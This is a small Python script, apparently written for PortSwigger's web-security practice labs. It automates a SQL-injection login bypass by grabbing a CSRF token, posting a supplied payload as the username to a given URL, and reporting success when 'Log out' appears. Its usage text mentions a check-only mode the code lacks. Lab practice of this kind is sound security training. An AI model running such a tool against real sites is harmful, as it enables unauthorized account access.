#https://portswigger.net/web-security/all-labs

from sys import argv        # To pass argument into script 
import requests 
from bs4 import BeautifulSoup # to get the value of csrf token





def GetCsrfToken(session, TargetUrl):
    r = session.get(TargetUrl)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf


def SendPayload(session, TargetUrl, Payload):
	csrf = GetCsrfToken(session,TargetUrl)
	SessionData = {'csrf': csrf,'username':Payload,'password':'Evry Thing is conected'}
	x = session.post(TargetUrl, data = SessionData)
	if "Log out" in x.text:
		print("Sql injection Found")








if __name__ == "__main__" :
	try:
		if len(argv) > 2:
			TargetUrl = argv[1]
			Payload = argv[2].strip()
			session = requests.Session()
			SendPayload(session, TargetUrl, Payload)
	except:
		print("[url] [Payload] to send Payload\n[url] to only check for sql injection]")